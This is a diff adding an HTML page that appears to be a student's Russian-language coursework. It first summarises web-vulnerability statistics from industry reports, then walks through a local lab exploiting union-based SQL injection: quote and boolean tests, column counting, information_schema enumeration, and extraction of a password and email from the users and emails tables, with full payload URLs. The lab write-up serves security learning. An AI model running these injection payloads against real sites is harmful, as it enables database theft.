@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Converted from Markdown</title>
+  <style>
+    body { 
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
+      line-height: 1.6; 
+      max-width: 800px; 
+      margin: 0 auto; 
+      padding: 20px;
+      color: #333;
+    }
+    h1, h2, h3 { color: #333; margin-top: 1.5em; margin-bottom: 0.5em; }
+    h1 { font-size: 2em; }
+    h2 { font-size: 1.5em; }
+    h3 { font-size: 1.2em; }
+    code { 
+      background: #f4f4f4; 
+      padding: 2px 4px; 
+      border-radius: 3px; 
+      font-family: 'Courier New', monospace;
+    }
+    pre { 
+      background: #f4f4f4; 
+      padding: 15px; 
+      border-radius: 5px; 
+      overflow-x: auto;
+      font-family: 'Courier New', monospace;
+      line-height: 1.4;
+    }
+    blockquote { 
+      border-left: 4px solid #ddd; 
+      margin: 1em 0; 
+      padding-left: 20px; 
+      color: #666;
+      font-style: italic;
+    }
+    table {
+      border-collapse: collapse;
+      width: 100%;
+      margin: 1em 0;
+    }
+    th, td {
+      border: 1px solid #ddd;
+      padding: 8px 12px;
+      text-align: left;
+    }
+    th {
+      background-color: #f5f5f5;
+      font-weight: bold;
+    }
+    ul, ol {
+      margin: 1em 0;
+      padding-left: 2em;
+    }
+    li {
+      margin: 0.5em 0;
+    }
+  </style>
+</head>
+<body>
+<h2>Часть 1. Исследование статистики веб-уязвимостей</h2>
+<h3>1. Источники информации</h3>
+<ol>
+<li><p><strong>Verizon DBIR 2025</strong> 
+<a href="https://www.verizon.com/business/resources/reports/dbir/">https://www.verizon.com/business/resources/reports/dbir/</a></p>
+</li>
+<li><p><strong>Verizon DBIR 2025 (InfoSecurity Magazine)</strong> 
+<a href="https://www.infosecurity-magazine.com/news/verizon-dbir-jump-vulnerability/">https://www.infosecurity-magazine.com/news/verizon-dbir-jump-vulnerability/</a></p>
+</li>
+<li><p><strong>Kaspersky Security Bulletin 2024</strong><br><a href="https://securelist.com/ksb-2024-statistics/114795/">https://securelist.com/ksb-2024-statistics/114795/</a></p>
+</li>
+<li><p><strong>OWASP Top 10 2024 (Reflectiz Analysis)</strong>
+<a href="https://www.reflectiz.com/blog/owasp-top-ten-2024/">https://www.reflectiz.com/blog/owasp-top-ten-2024/</a></p>
+</li>
+<li><p><strong>Inside the 2025 Verizon DBIR</strong>
+<a href="https://www.edgescan.com/inside-the-2025-verizon-dbir/">https://www.edgescan.com/inside-the-2025-verizon-dbir/</a></p>
+</li>
+<li><p><strong>Aikido Security — The State of SQL Injection 2024</strong>
+<a href="https://www.aikido.dev/blog/the-state-of-sql-injections">https://www.aikido.dev/blog/the-state-of-sql-injections</a></p>
+</li>
+</ol>
+<h3>2. Доля успешных атак через эксплуатацию веб-уязвимостей</h3>
+<p>Где-то считают все инциденты, где-то только подтверждённые утечки, где-то только веб-вектор. Провела сравнение и сделала выводы:</p>
+<p><strong>2.1 Verizon DBIR 2025</strong>
+Примерно 30% всех подтверждённых инцидентов связаны с эксплуатацией уязвимостей веб-приложений.
+Они отдельно отмечают, что атаки на веб-приложения растут быстрее, чем другие типы атак. Основная причина - многие компании выкладывают сервисы в публичный доступ без должной защиты.</p>
+<p><strong>2.2 Verizon DBIR 2025 (InfoSecurity Magazine)</strong>
+20% всех утечек связаны с эксплуатацией уязвимостей.<br>После 180% роста в прошлом году, эксплуатация уязвимостей продолжает расти.
+Фишинг составляет 16% утечек, занимая третье место.</p>
+<p><strong>2.3 Edgescan 2024 (Web Application Focus)</strong>
+В их отчете указано, что 42% эксплойтов приходятся именно на веб-приложения.</p>
+<p>Наблюдения:
+Цифры разнятся в зависимости от того, что считаем:</p>
+<ul>
+<li><strong>20%</strong> - если брать все утечки данных</li>
+<li><strong>42%</strong> - если брать только эксплойты против веб-приложений</li>
+</ul>
+<h3>3. Распределение по категориям веб-уязвимостей</h3>
+<p>Классификации отличаются - OWASP использует свою топ-10, другие компании - свои категории. Попробовала свести данные к общему виду:</p>
+<p><strong>3.1 Edgescan Vulnerability Statistics 2024</strong>
+Наиболее распространенной критической уязвимостью веб-приложений является SQL Injection (CWE-89). Ещё с 2022 года.</p>
+<p><strong>3.2 Aikido Security — SQL Injection Statistics</strong>
+По их данным 6.7% всех уязвимостей, обнаруженных в open-source проектах в 2024 году, составляют SQL-инъекции. При этом SQLi чаще других приводят к критическим последствиям.</p>
+<p><strong>3.3 OWASP Top 10 2024 (Reflectiz)</strong>
+Наиболее критичные уязвимости по версии OWASP:</p>
+<ul>
+<li>Broken Access Control - Критический приоритет</li>
+<li>Injection - Критический приоритет</li>
+<li>Identification and Authentication Failures - Высокий приоритет</li>
+</ul>
+<p><strong>3.4 Kaspersky Security Bulletin 2024</strong>
+Kaspersky заблокировал 72194144 уникальных вредоносных объектов с помощью Web Anti-Virus компонентов в 2024 году.<br>Также обнаружено 85013784 уникальных вредоносных URL.</p>
+<p><strong>Вывод по первой части:</strong></p>
+<ol>
+<li>Примерно <strong>20–42%</strong> успешных атак на организации происходят через веб-уязвимости (в зависимости от методологии подсчета)</li>
+<li>Среди них лидируют:</li>
+</ol>
+<ul>
+<li>SQL Injection (наиболее распространенная критическая уязвимость)</li>
+<li>Broken Access Control</li>
+<li>Authentication Failures</li>
+</ul>
+<ol start="3">
+<li>SQL-инъекции составляют около <strong>6.7%</strong> всех уязвимостей в open-source, но при этом остаются одними из самых опасных по последствиям</li>
+</ol>
+<hr>
+<h2>Часть 2. Практическая работа с SQL-инъекциями</h2>
+<h3>1. Поиск точки входа</h3>
+<p>Запрос:</p>
+<pre><code>http://localhost:8080/task/?id=1
+</code></pre>
+<p>Ответ:</p>
+<pre><code>Ваш id: 1
+Ваш логин: admin
+</code></pre>
+<p>Всё работает. Видно, что приложение принимает параметр id и возвращает данные из БД.</p>
+<p>Запрос:
+Написала одиночную кавычку, чтобы нарушить синтаксис SQL.</p>
+<pre><code>http://localhost:8080/task/?id=1&#39;
+</code></pre>
+<p>Ответ:</p>
+<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1
+</code></pre>
+<p>Ошибка есть, значит, ввод не фильтруется. Приложение явно собирает SQL-запрос конкатенацией строк.</p>
+<p>Запрос:
+Чтобы убедиться, что я могу влиять на запрос, попробовала добавить условие, которое всегда истинно.</p>
+<pre><code>http://localhost:8080/task/?id=1&#39; OR 1=1 --+
+</code></pre>
+<p>Ответ:</p>
+<pre><code>Ваш id: 1
+Ваш логин: admin
+</code></pre>
+<p>Страница загрузилась. Попробовала ложное условие:</p>
+<pre><code>http://localhost:8080/task/?id=1&#39; AND 1=2 --+
+</code></pre>
+<p>Ответ: Пустая страница.
+Уязвимость подтверждена. Я могу управлять логикой запроса.</p>
+<p>Обоснование запроса:
+Сначала я пробовала просто закрывать запрос кавычкой, но получала ошибки синтаксиса. Я поняла, что оригинальный запрос продолжает выполняться после моего ввода. Чтобы обрезать лишнюю часть запроса, нужно использовать комментарий (конструкцию --+).</p>
+<h3>2. Определение структуры запроса</h3>
+<p>Чтобы вытащить данные через UNION SELECT, нужно знать количество столбцов в исходном запросе. Видела решение через ORDER BY, но решила попробовать метод подбора NULL значений - мне так понятнее.</p>
+<p>Попытка 1:</p>
+<pre><code>http://localhost:8080/task/?id=1&#39; UNION SELECT NULL --+
+</code></pre>
+<p>Ошибка.</p>
+<p>Попытка 2:</p>
+<pre><code>http://localhost:8080/task/?id=1&#39; UNION SELECT NULL, NULL --+
+</code></pre>
+<p>Ошибка.</p>
+<p>Попытка 3:</p>
+<pre><code>http://localhost:8080/task/?id=1&#39; UNION SELECT NULL, NULL, NULL --+
+</code></pre>
+<p>Страница загрузилась успешно.
+Вывод: В запросе 3 столбца.</p>
+<h3>3. Выяснение, какой столбец выводится на экран</h3>
+<pre><code>http://localhost:8080/task/?id=10&#39; UNION SELECT 1, &#39;TEST&#39;, 3 --+
+</code></pre>
+<p>Данные выводятся через второй столбец. Первый и третий игнорируются визуально. Можем подставлять туда любые данные из БД.</p>
+<p>Наблюдение:
+Сначала использовала id=1 для тестов, но заметила, что мои данные через UNION не отображаются - вместо них показывались данные существующего пользователя. Я поняла, что оригинальный запрос возвращает свою строку, и она приоритетна при отображении.
+Тогда начала использовать id=10 (несуществующий ID). В этом случае оригинальный запрос возвращает пустой результат, и данные из моего UNION SELECT отображаются корректно. Это позволило мне точно видеть результат каждой инъекции.</p>
+<h3>4. Извлечение структуры базы данных</h3>
+<p>Сначала узнала имя текущей базы.</p>
+<pre><code>http://localhost:8080/task/?id=10&#39; UNION SELECT 1, database(), 3 --+
+</code></pre>
+<p>Имя БД: security.</p>
+<p>В MySQL вся мета-информация хранится в information_schema.</p>
+<pre><code>http://localhost:8080/task/?id=10&#39; UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=&#39;security&#39; --+
+</code></pre>
+<p>Есть таблица users (пароли) и emails (почта).</p>
+<h3>5. Задание 1</h3>
+<p>Сначала нужно узнать структуру таблицы users, чтобы знать имена столбцов.</p>
+<pre><code>http://localhost:8080/task/?id=10&#39; UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name=&#39;users&#39; --+
+</code></pre>
+<p>Есть стандартные столбцы id,username,password</p>
+<p>Попытка получить пароль напрямую:</p>
+<pre><code>http://localhost:8080/task/?id=10&#39; UNION SELECT 1, password, 3 FROM users --+
+</code></pre>
+<p>Вывелся только первый.</p>
+<p>Решение через WHERE:</p>
+<pre><code>http://localhost:8080/task/?id=10&#39; UNION SELECT 1, password, 3 FROM users WHERE username=&#39;Volk2&#39; --+
+</code></pre>
+<p><strong>Ответ: Wa spoiuuuuu</strong></p>
+<h3>6. Задание 2</h3>
+<p>Неудачная попытка:</p>
+<pre><code>http://localhost:8080/task/?id=10&#39; UNION SELECT 1, email, 3 FROM emails --+
+</code></pre>
+<p>Ошибка: Unknown column &#39;email&#39; in &#39;field list&#39;.</p>
+<p>Посмотрела структуру таблицы emails.</p>
+<pre><code>http://localhost:8080/task/?id=10&#39; UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name=&#39;emails&#39; --+
+</code></pre>
+<p>Столбец называется email_id.</p>
+<p>Узнаем ID пользователя Vinni-pukh в таблице users, чтобы связать её с таблицей emails.</p>
+<pre><code>http://localhost:8080/task/?id=10&#39; UNION SELECT 1, id, 3 FROM users WHERE username=&#39;Vinni-pukh&#39; --+
+</code></pre>
+<p>ID пользователя = 4.</p>
+<pre><code>http://localhost:8080/task/?id=10&#39; UNION SELECT 1, email_id, 3 FROM emails WHERE id=4 --+
+</code></pre>
+<p><strong>Ответ: <a href="mailto:honey_lover@otus-lab.com">honey_lover@otus-lab.com</a>.</strong></p>
+
+</body>
+</html>
